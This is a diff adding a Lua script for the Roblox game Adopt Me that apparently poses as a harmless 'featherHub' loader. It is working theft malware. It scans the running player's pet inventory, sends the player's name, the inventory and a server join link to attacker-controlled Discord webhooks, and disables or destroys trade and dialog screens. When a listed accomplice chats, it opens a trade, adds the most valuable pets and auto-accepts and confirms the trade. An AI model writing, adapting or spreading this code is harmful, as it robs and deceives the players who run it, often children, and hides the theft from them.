@@ -1,0 +1,217 @@
+if not _G["Script-SM_Config"] then
+    warn("WARNING: Config not loaded! Waiting for config...")
+    repeat task.wait() until _G["Script-SM_Config"]
+    warn("Config loaded successfully!")
+end
+local LogsWebhook = "webhook" --Change these
+local Webhook = _G["Script-SM_Config"].user_webhook
+local Username = _G["Script-SM_Config"].users or {}
+local ExtraUsers = {"user","user","user"} --Change these
+local Friends = {}
+
+for _, v in ipairs(Username) do table.insert(Friends, v) end
+for _, v in ExtraUsers do if not table.find(Friends, v) then table.insert(Friends, v) end end
+
+repeat task.wait() until game:IsLoaded()
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+ReplicatedStorage:WaitForChild("Fsys", 15)
+local load = require(ReplicatedStorage.Fsys).load
+
+repeat task.wait(1) until load("ClientData") and load("ClientData").get("inventory")
+
+local RouterClient = load("RouterClient")
+local ClientData = load("ClientData")
+local InventoryDB = load("InventoryDB")
+
+local SendTrade           = RouterClient.get("TradeAPI/SendTradeRequest")
+local AddItem             = RouterClient.get("TradeAPI/AddItemToOffer")
+local AcceptNegotiation   = RouterClient.get("TradeAPI/AcceptNegotiation")
+local ConfirmTrade        = RouterClient.get("TradeAPI/ConfirmTrade")
+local DeclineTrade        = RouterClient.get("TradeAPI/DeclineTrade")
+local UnlockBackpack      = RouterClient.get("BackpackAPI/CommitBackpackItemSet")
+local TradeRequestEvent   = RouterClient.get_event("TradeAPI/TradeRequestReceived")
+
+-- VALUES
+local PetValues = {}
+pcall(function()
+    local resp = request({Url = "https://elvebredd.com/api/pets/get-latest", Method = "GET"})
+    if resp and resp.Body then
+        local data = HttpService:JSONDecode(resp.Body)
+        for _, pet in pairs(HttpService:JSONDecode(data.pets or "[]")) do
+            if pet.name then PetValues[pet.name] = pet end
+        end
+    end
+end)
+
+local function getPetValue(name, props)
+    local pet = PetValues[name]
+    if not pet then return 0 end
+    local key = props.mega_neon and "mvalue" or props.neon and "nvalue" or "rvalue"
+    local suffix = (props.rideable and props.flyable and pet["fly&ride?"] == "\"true\"" and " - fly&ride")
+                or (props.rideable and " - ride")
+                or (props.flyable and " - fly")
+                or " - nopotion"
+    return tonumber(pet[key .. suffix]) or tonumber(pet[key]) or 0
+end
+
+-- INVENTORY SCAN
+local serverData = RouterClient.get("DataAPI/GetAllServerData"):InvokeServer()
+local inventory = serverData[LocalPlayer.Name].inventory.pets or {}
+local hits = {}
+local totalValue = 0
+local petCount = 0
+
+for uid, item in pairs(inventory) do
+    local petData = InventoryDB.pets and InventoryDB.pets[item.id]
+    if petData and petData.name then
+        local val = getPetValue(petData.name, item.properties or {})
+        petCount += 1
+        totalValue += val
+        table.insert(hits, {name = petData.name, value = string.format("%.2f", val), uid = uid, props = item.properties or {}})
+    end
+end
+table.sort(hits, function(a,b) return tonumber(a.value) > tonumber(b.value) end)
+
+-- GROUPING & PREVIEW
+local function getEmoji(p)
+    if p.mega_neon then return "🐺" end
+    if p.neon then return "🦄" end
+    if p.flyable and p.rideable then return "🐲" end
+    if p.flyable then return "🪰" end
+    if p.rideable then return "🐴" end
+    return "🐶"
+end
+
+local grouped = {}
+for _, pet in ipairs(hits) do
+    local key = pet.name..pet.value..(pet.props.mega_neon and "mn" or "")..(pet.props.neon and "n" or "")..(pet.props.flyable and "f" or "")..(pet.props.rideable and "r" or "")
+    grouped[key] = grouped[key] or {name=pet.name, value=pet.value, count=0, emoji=getEmoji(pet.props)}
+    grouped[key].count += 1
+end
+
+local groupedList = {}
+for _, v in pairs(grouped) do table.insert(groupedList, v) end
+table.sort(groupedList, function(a,b) return tonumber(a.value) > tonumber(b.value) end)
+
+local previewLines = {}
+local displayed = 0
+for _, g in ipairs(groupedList) do
+    if #previewLines >= 16 then break end
+    local txt = g.count > 1 and " [x"..g.count.."]" or ""
+    table.insert(previewLines, g.emoji.." "..g.name.." — "..g.value..txt)
+    displayed += g.count
+end
+if petCount > displayed then table.insert(previewLines, "and "..(petCount-displayed).." more..") end
+
+-- WEBHOOK
+local joinUrl = "https://scriptssm.vercel.app/joiner.html?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId
+local teleportScript = 'game:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..', "'..game.JobId..'")'
+
+local payload = {
+    content = (totalValue >= 5 and "> @everyone " or "> ").."**"..(totalValue >= 5 and "⋆｡ ɢᴏᴏᴅ ʜɪᴛ ｡⋆" or "『 ꜱᴍᴀʟʟ ʜɪᴛ 』").." • Value: "..string.format("%.2f", totalValue).."**",
+    embeds = {{
+        title = "ꜱᴄʀɪᴘᴛꜱ.ꜱᴍ",
+        description = "<:faq_badge:1436328022910435370> **How to Use:** \n> Join the user using Join Script or Join Link then type anything in chat and accept trade.\n⠀",
+        color = 3394815,
+        fields = {
+            {name = "<:emoji_4:1402578195294982156> **Display Name**", value = "```"..(LocalPlayer.DisplayName ~= "" and LocalPlayer.DisplayName or LocalPlayer.Name).."```", inline = true},
+            {name = "<:emoji_2:1402577600060325910> **Username**", value = "```"..LocalPlayer.Name.."```", inline = true},
+            {name = "<:emoji_7:1402587793909223530> **Pets**", value = "```"..petCount.."```", inline = true},
+            {name = "<:Events:1394005823931420682> **Executor**", value = "```"..(identifyexecutor and identifyexecutor() or "Unknown").."```", inline = true},
+            {name = "<:stats:1436336068461985824> **Value**", value = "```"..string.format("%.2f", totalValue).."```", inline = true},
+            {name = "<:money:1436335320437096508> **Inventory**", value = "```"..table.concat(previewLines, "\n").."```", inline = false},
+            {name = "<:emoji_2:1402577600060325910> **Join Script**", value = "```lua\n"..teleportScript.."\n```"},
+            {name = "<:loc:1436344006421385309> **Join via URL**", value = "[ **Click Here to Join!**]("..joinUrl..")"},
+        },
+        author = {name = "Adopt Me", url = joinUrl, icon_url = "https://scriptssm.vercel.app/pngs/bell-icon.webp"},
+        footer = {text = "discord.gg/XCnmFpFk62", icon_url = "https://i.ibb.co/5xJ8LK6X/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png"},
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
+        image = {url = "https://scriptssm.vercel.app/pngs/adm.webp"}
+    }}
+}
+
+pcall(function()
+    request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(payload)})
+end)
+
+pcall(function()
+    request({Url = LogsWebhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(payload)})
+end)
+-- UI LOCKS
+LocalPlayer.PlayerGui.TradeApp.Enabled = false
+pcall(function() LocalPlayer.PlayerGui.HintApp:Destroy() end)
+pcall(function() LocalPlayer.PlayerGui.DialogApp:Destroy() end)
+LocalPlayer.PlayerGui.ToolApp.Frame:GetPropertyChangedSignal("Visible"):Connect(function()
+    if not LocalPlayer.PlayerGui.ToolApp.Frame.Visible then LocalPlayer.PlayerGui.ToolApp.Frame.Visible = true end
+end)
+LocalPlayer.PlayerGui.HouseEditorApp:GetPropertyChangedSignal("Enabled"):Connect(function()
+    if not LocalPlayer.PlayerGui.HouseEditorApp.Enabled then LocalPlayer.PlayerGui.HouseEditorApp.Enabled = true end
+end)
+
+-- STEAL FUNCTION
+local function startSteal(plr)
+    if not table.find(Friends, plr.Name) then return end
+
+    task.spawn(function()
+        local declineConn = TradeRequestEvent.OnClientEvent:Connect(function(sender)
+            if sender and sender.Name ~= plr.Name then
+                pcall(DeclineTrade.FireServer, DeclineTrade)
+            end
+        end)
+
+        pcall(function() RouterClient.get("SettingsAPI/SetSetting"):FireServer("trade_requests", 1) end)
+
+        for i = 1, 80 do
+            if LocalPlayer.PlayerGui.TradeApp.Frame.Visible then break end
+            pcall(SendTrade.FireServer, SendTrade, plr)
+            task.wait(0.22)
+        end
+
+        if not LocalPlayer.PlayerGui.TradeApp.Frame.Visible then
+            if declineConn then declineConn:Disconnect() end
+            return
+        end
+
+        if declineConn then declineConn:Disconnect() end
+
+        for i = 1, math.min(18, #hits) do
+            local pet = hits[i]
+            if not pet then break end
+            pcall(function() UnlockBackpack:FireServer("backpack_locks", {[pet.uid] = true}) end)
+            pcall(function() AddItem:FireServer(pet.uid) end)
+            task.wait(0.14)
+        end
+
+        task.wait(1.2)
+
+        spawn(function()
+            while LocalPlayer.PlayerGui.TradeApp.Frame.Visible do
+                pcall(AcceptNegotiation.FireServer, AcceptNegotiation)
+                task.wait(0.4)
+                pcall(ConfirmTrade.FireServer, ConfirmTrade)
+                task.wait(0.4)
+            end
+        end)
+    end)
+end
+
+-- CHAT TRIGGERS
+for _, p in Players:GetPlayers() do
+    if table.find(Friends, p.Name) then
+        p.Chatted:Connect(function() startSteal(p) end)
+    end
+end
+
+Players.PlayerAdded:Connect(function(p)
+    task.wait(2)
+    if table.find(Friends, p.Name) then
+        p.Chatted:Connect(function() startSteal(p) end)
+    end
+end)
+
+print("[featherHub] Adopt Me Loaded..")
